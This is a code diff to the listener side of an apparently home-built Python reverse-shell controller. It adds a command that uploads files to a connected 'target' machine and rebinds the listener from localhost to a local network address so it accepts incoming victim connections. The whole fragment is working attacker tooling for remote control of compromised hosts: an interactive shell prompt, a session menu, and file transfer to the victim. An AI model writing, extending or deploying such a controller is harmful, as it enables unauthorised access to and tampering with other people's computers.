@@ -17,6 +17,10 @@ def send_data(data):
 	jsondata = json.dumps(data) # serializing the data so as to send reliably.
 	target.send(jsondata.encode()) # encoding the serialized data & sending it to the target.
 
+def upload_file(file_name):
+	f = open(file_name, "rb")
+	target.send(f.read())
+
 def target_communication():
 	while True:
 		command = input(f"* Shell~{ip}: ").lower()
@@ -27,6 +31,8 @@ def target_communication():
 			os.system('clear')
 		elif command[:3] == "cd ":
 			pass
+		elif command[:6] == "upload":
+			upload_file(command[7:])
 		elif command == "help":
 			            print(colored('''\n
             quit                                --> Quit Session With The Target
@@ -49,7 +55,7 @@ if __name__ == "__main__":
 	print(ascii_banner)
 
 	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	sock.bind(("127.0.0.1", 5555))
+	sock.bind(("192.168.1.105", 5555))
 	print(colored("[+] Listening  for Incomig Connections.", "yellow"))
 	sock.listen(5)
 
